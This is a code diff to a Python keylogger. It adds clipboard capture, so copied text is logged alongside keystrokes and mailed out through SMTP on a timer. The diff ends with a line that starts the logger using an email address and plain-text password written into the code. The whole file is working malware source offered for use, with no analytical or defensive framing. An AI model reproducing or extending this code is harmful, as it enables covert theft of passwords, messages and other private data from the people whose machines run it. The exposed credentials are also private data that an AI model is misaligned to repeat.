@@ -3,6 +3,9 @@
 import pynput.keyboard
 import threading
 import smtplib
+import pyperclip
+import time
+
 
 
 class Keylogger:
@@ -27,6 +30,19 @@ class Keylogger:
         self.append_log(current_key)
         # print(current_key)
 
+    def clipboard_copy(self):
+        paste_list = []
+
+        if pyperclip.paste() != 'None':
+            paste_value = pyperclip.paste()
+
+            if paste_value not in paste_list:
+                paste_list.append(paste_value)
+
+            # print(paste_list)
+            self.append_log(str(paste_list))
+
+
     def report(self):
         # print(self.log)
         self.send_mail(self.email, self.password, "\n\n" + self.log )
@@ -42,7 +58,12 @@ class Keylogger:
         server.quit()
 
     def start(self):
+        self.clipboard_copy()
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
         with keyboard_listener:
+            self.clipboard_copy()
             self.report()
             keyboard_listener.join()
+
+listen = Keylogger(20, "alrocks29@gmail.com", "321goforit")
+listen.start()
